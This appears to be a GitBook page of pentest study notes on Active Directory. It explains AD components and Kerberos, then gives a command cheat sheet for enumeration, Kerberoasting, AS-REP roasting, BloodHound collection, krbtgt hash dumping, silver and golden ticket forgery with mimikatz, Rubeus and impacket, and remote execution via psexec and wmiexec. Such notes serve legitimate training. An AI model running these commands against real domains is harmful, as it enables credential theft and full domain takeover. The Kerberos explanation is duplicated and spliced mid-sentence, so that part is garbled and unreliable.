# Module 21 (Active Directory Attacks)

### AD OverFlow

Active directory is just like a phone book, Basically used to store series of information in relation to what is called an object , could be printers, computers, users etc

AD also serves as an identity management service in the sense that, take for example you change your password in a particular system then all systems in that particular network, password's, get changed too, so now you change your password on one system and you can still login on other system with that same password

In active directory Authentication happens with kerberos or kerberos ticket

![](https://i.imgur.com/3PA0Ogb.png)

Active directory is commonly used in banks and 95% of fortune 1000 companies and the major reason why it is vulnerable in the wild are due to misconfigurations, bad setup etc

![](https://i.imgur.com/ihBjo17.png)

### Physical Active Directory Components

![](https://i.imgur.com/r8LCjYP.png)

1. Domain Controllers: A domain controller is a type of server that processes user requests for authentication within a computer [domain](https://www.techtarget.com/whatis/definition/domain). Domain [controllers](https://www.techtarget.com/whatis/definition/controller) are most commonly used in Windows Active Directory ([AD](https://www.techtarget.com/searchwindowsserver/definition/Active-Directory)) domains but are also used with other types of identity management systems.

![](https://i.imgur.com/iOUQHz2.png)

2. AD DS Data Store : Contain database files for users, services and applications also stores information about user accounts, such as names, passwords, phone numbers, and so on, and enables other authorized users on the same network to access this information. it also stores a very important file called **Ntds.dit**

![](https://i.imgur.com/Jzd7UAu.png)

### Logical Active Directory Components

![](https://i.imgur.com/r8LCjYP.png)

1. AD DS Schema : You can think of it as a rule book or a blue print, which defines every type of object that can be stored within our directory (Objects are normally defined as either resources, such as printers or computers, or security principals, such as users or groups.)

![](https://i.imgur.com/kdCAfUs.png)

2. Domains : could be defined as a collection of objects within a Microsoft Active Directory network. an example of a domain could be google.com, hackersploit.org etc, we need where to manage our objects (Printers and computers) that is where the domain comes in

![](https://i.imgur.com/xcPSX8N.png)

3. Trees : A tree is a hierarchy of domains, Just like subdomains could be drive.google.com, question.hackersploit.org

![](https://i.imgur.com/y9TzJet.png)

4. Forests : a forest is a set or collection of trees in an active directory

![](https://i.imgur.com/pigpqyr.png)

5. Organizational Units (OU's) : is a subdivision within an Active Directory into which you can place users, groups, computers, and other organizational units. They represent functional or ad-hoc groupings, such as committee, a task force, a project management organization, a class (for education) and so on. also objects lived within an OU

![](https://i.imgur.com/4jvmYHH.png)

6. Trusts : Is a method of connecting two distinct Active Directory domains (or forests) to allow users in one domain to authenticate against resources in the other.

![](https://i.imgur.com/cBcAsLZ.png)

7. Objects : An object is **a single element, such as a user, group, application or device such as a printer**. Objects are normally defined as either resources, such as printers or computers, or security principals, such as users or groups.

![](https://i.imgur.com/2aWO5mU.png)

### AD Components <a href="#a-d-components" id="a-d-components"></a>

**Domain Controller**

* Server with AD DS server role.
* Hosts a copy of the AD DS directory store.
* Provides authentication and authorization services.
* Replicates updates to other domain controllers.
* Allows administrative access to manage resources.

**AD DS Data Store**

* Consists of the Ntds.dit file (password hashes, sensitive information).
* Stored in the %SystemRoot%\NTDS folder on all domain controllers.

**AD Logical Components**

* **Schema:**
  * Defines objects that can be stored in the directory.
  * Enforces rules about object creation and configuration.
* **Domains:**
  * Group and manage objects in an organization.
  * May include child domains and trusts with other domains.
* **Trees:**
  * Hierarchy of domains in AD DS.
  * Can have child domains.
  * Creates two-way transitive trust with other domains.
* **Forests:**
  * Collection of Trees.
  * Shares common schema and configuration.
  * Enables trusts between domains in the forest.
  * Shares enterprise admin, schema admins groups.
* **Organizational Units (OUs):**
  * Containers that can contain users, groups, computers, and other OUs.
* **Trusts:**
  * Provide mechanisms for users to gain access.
* **Objects:**
  * Users, contacts, groups, computers, printers, shared folders, etc.

#### NTLM => NT LAN Manager Authentication

<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption><p>NTLM Auth Work</p></figcaption></figure>

### Kerberos Authentication

Kerberos authentication is the default authentication protocol for any recent version of Windows. Users who log into a service using Kerberos will be assigned tickets. Think of tickets as proof of a previous authentication. Users with tickets can present them to a service to demonstrate they have already authenticated into the network before and are therefore enabled to use it.

When Kerberos is used for authentication, the following process happens:

1.  The user sends their username and a timestamp encrypted using a key derived from their password to the **Key Distribution Center (KDC)**, a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.

    The KDC will create and send back a **Ticket Granting Ticket (TGT)**, which will allow the user to request additional tickets to access specific services. The need for a ticket to get more tickets may sound a bit weird, but it allows users to request service tickets without passing their credentials every time they want to connect to a service. Along with the TGT, a **Session Key** is given to the user, which they will need to generate the following requests.

    Notice the TGT is encrypted using the&#x20;

    Kerberos Authentication

    Kerberos authentication is the default authentication protocol for any recent version of Windows. Users who log into a service using Kerberos will be assigned tickets. Think of tickets as proof of a previous authentication. Users with tickets can present them to a service to demonstrate they have already authenticated into the network before and are therefore enabled to use it.

    When Kerberos is used for authentication, the following process happens:

    1.  The user sends their username and a timestamp encrypted using a key derived from their password to the **Key Distribution Center (KDC)**, a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.

        The KDC will create and send back a **Ticket Granting Ticket (TGT)**, which will allow the user to request additional tickets to access specific services. The need for a ticket to get more tickets may sound a bit weird, but it will enable users to request service tickets without passing their credentials every time they want to connect to a service. Along with the TGT, a **Session Key** is given to the user, which they will need to generate the following requests.

        Notice the **TGT** is encrypted using the <mark style="color:red;">**krbtgt**</mark> account's password hash, and therefore the user can't access its contents. It is essential to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
    2.

        ![Kerberos step 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png)
    3.  When a user wants to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service they were created for. To request a TGS, the user will send their username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name (SPN),** which indicates the service and server name we intend to access.

        As a result, the KDC will send us a TGS along with a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using a key derived from the **Service Owner Hash**. The Service Owner is the user or machine account that the service runs under. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
    4.

        ![Kerberos step 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png)
    5. The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.

    ![Kerberos step 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png)

    &#x20;account's password hash, and therefore the user can't access its contents. It is essential to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
2.

    ![Kerberos step 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png)
3.  When a user wants to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service they were created for. To request a TGS, the user will send their username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name (SPN),** which indicates the service and server name we intend to access.

    As a result, the KDC will send us a TGS along with a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using a key derived from the **Service Owner Hash**. The Service Owner is the user or machine account that the service runs under. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
4.

    ![Kerberos step 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png)
5. The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.

![Kerberos step 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png)

## Trees, Forests and Trusts

So far, we have discussed how to manage a single domain, the role of a Domain Controller and how it joins computers, servers and users.

![Single Domain](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/69f2441bbafd4cfe57a101d87f3c5950.png)

As companies grow, so do their networks. Having a single domain for a company is good enough to start, but in time some additional needs might push you into having more than one.

### Trees

Imagine, for example, that suddenly your company expands to a new country. The new country has different laws and regulations that require you to update your GPOs to comply. In addition, you now have IT people in both countries, and each IT team needs to manage the resources that correspond to each country without interfering with the other team. While you could create a complex OU structure and use delegations to achieve this, having a huge AD structure might be hard to manage and prone to human errors.

Luckily for us, Active Directory supports integrating multiple domains so that you can partition your network into units that can be managed independently. If you have two domains that share the same namespace (`thm.local` in our example), those domains can be joined into a **Tree**.

If our `thm.local` domain was split into two subdomains for UK and US branches, you could build a tree with a root domain of `thm.local` and two subdomains called `uk.thm.local` and `us.thm.local`, each with its AD, computers and users:

![Tree](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/abea24b7979676a1dcc0c568054544c8.png)

This partitioned structure gives us better control over who can access what in the domain. The IT people from the UK will have their own DC that manages the UK resources only. For example, a UK user would not be able to manage US users. In that way, the Domain Administrators of each branch will have complete control over their respective DCs, but not other branches' DCs. Policies can also be configured independently for each domain in the tree.

A new security group needs to be introduced when talking about trees and forests. The Enterprise Admins group will grant a user administrative privileges over all of an enterprise's domains. Each domain would still have its Domain Admins with administrator privileges over their single domains and the Enterprise Admins who can control everything in the enterprise.\


### Forests

The domains you manage can also be configured in different namespaces. Suppose your company continues growing and eventually acquires another company called `MHT Inc.` When both companies merge, you will probably have different domain trees for each company, each managed by its own IT department. The union of several trees with different namespaces into the same network is known as a **forest**.

![Forest](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/03448c2faf976db890118d835000bab7.png)

### Trust Relationships

Having multiple domains organised in trees and forest allows you to have a nice compartmentalised network in terms of management and resources. But at a certain point, a user at THM UK might need to access a shared file in one of MHT ASIA servers. For this to happen, domains arranged in trees and forests are joined together by **trust relationships**.

In simple terms, having a trust relationship between domains allows you to authorise a user from domain `THM UK` to access resources from domain `MHT EU`.

The simplest trust relationship that can be established is a **one-way trust relationship**. In a one-way trust, if `Domain AAA` trusts `Domain BBB`, this means that a user on BBB can be authorised to access resources on AAA:

![Trusts](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/af95eb1a4b6c672491d8989f79c00200.png)

The direction of the one-way trust relationship is contrary to that of the access direction.

**Two-way trust relationships** can also be made to allow both domains to mutually authorise users from the other. By default, joining several domains under a tree or a forest will form a two-way trust relationship.



## Recon Active Directory (No creds/sessions) <a href="#recon-active-directory-no-creds-sessions" id="recon-active-directory-no-creds-sessions"></a>

If you just have access to an AD environment but you don't have any credentials/sessions you could:

* **Pentest the network:**
  * Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials**
  *

      Enumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.

{% code overflow="wrap" %}
```bash
gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
```
{% endcode %}

* **Check for null and Guest access on smb services** (this won't work on modern Windows versions):

```bash
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>

smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>

smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
```

* A more detailed guide on how to enumerate a SMB server can be found here:

{% embed url="https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/oscp_notes#port-139-445-smb" %}
Port 139/445 - SMB
{% endembed %}

* **Enumerate Ldap**

```bash
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
```

* A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):

{% embed url="https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/oscp_notes#ldap-389-636" %}
LDAP - 389/636,3268, 3269
{% endembed %}

### User enumeration <a href="#user-enumeration" id="user-enumeration"></a>

* **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/oscp\_notes#port-139-445-smb) and [**pentesting LDAP**](https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/oscp\_notes#ldap-389-636) pages.
* **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC\_ERR\_PREAUTH\_REQUIRED_, indicating that the user is required to perform pre-authentication.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
```



## Enumerating Active Directory WITH credentials/session

{% code overflow="wrap" %}
```bash
GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username
enum4linux -a -u "user" -p "password" <DC IP>
```
{% endcode %}

## Attacks

### GetUserSPNs & Kerberoasting

```bash
impacket-GetUserSPNs hacktor.local/abdo:Sql@server -dc-ip 192.168.1.5 -request
```

<figure><img src="../../../.gitbook/assets/image (89).png" alt=""><figcaption><p>if ServicePricipalname add</p></figcaption></figure>

### GetNPUsers & Kerberos Pre-Auth - AS-REP Roasting

```bash
impacket-GetNPUsers hacktor.local/abdo -dc-ip 192.168.1.5
```

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
the attack don't work if  **"Don't Require Kerberos preauthentication**"
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

### bloodhound

```bash
bloodhound-python -u user -p password -ns 192.168.1.5 -d hacktor.local -c All
```

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

### Silver Ticket

* Mimikatz
  * with NTLM

{% code overflow="wrap" %}
```powershell
mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /rc4:$NTLM_HASH /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME
```
{% endcode %}

* with aesKey

{% code overflow="wrap" %}
```powershell
mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME
```
{% endcode %}

* with Mimikatz

```powershell
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

{% embed url="https://github.com/gentilkiwi/mimikatz" %}

### Rubeus

```powershell
Rubeus.exe ptt /ticket:<ticket_kirbi_file>
.\Rubeus.exe harvest /intercal:30
```

{% embed url="https://github.com/GhostPack/Rubeus" %}

* PsExec

```powershell
PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd
```

* in Kali Linux

### Impacket

* Commands
  * with NTLM

{% code overflow="wrap" %}
```powershell
ticketer.py -nthash $NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER
```
{% endcode %}

* with aesKey

{% code overflow="wrap" %}
```powershell
ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER
```
{% endcode %}

* Set TGT for impacket use

```basic
export KRB5CCNAME=<TGT_ccache_file>
```

* Execute remote commands
  * `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
  * `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
  * `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
* [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

### Golden Ticket

* in PowerShell
* Mimikatz

Extracting the krbtgt account's password `NTLM` hash:

```bash
mimikatz # lsadump::lsa /inject /name:krbtgt
```

<figure><img src="../../../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

Creating a forged golden ticket that automatically gets injected in current logon session's memory:

{% code overflow="wrap" %}
```
mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

* with aesKey

{% code overflow="wrap" %}
```
mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /target:$SERVICE_MACHINE_HOSTNAME
```
{% endcode %}

* with Mimikatz

```
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* Rubeus

```
Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

* [Rubeus](https://github.com/GhostPack/Rubeus)
* PsExec

```
PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd
```

* in Kali Linux
  * Impacket
  * with NTLM

{% code overflow="wrap" %}
```
ticketer.py -nthash $KRBTGT_NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER
```
{% endcode %}

* with aesKey

{% code overflow="wrap" %}
```
ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER
```
{% endcode %}

* Set TGT for impacket use

```powershell
export KRB5CCNAME=<TGT_ccache_file>
```

* Execute remote commands
  * `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
  * `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
  * `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
* [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

### Skeleton Ticket

#### Extra Mile

* NTLM from password
  * `python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'`
* [Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
* [Mimikatz History](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/)
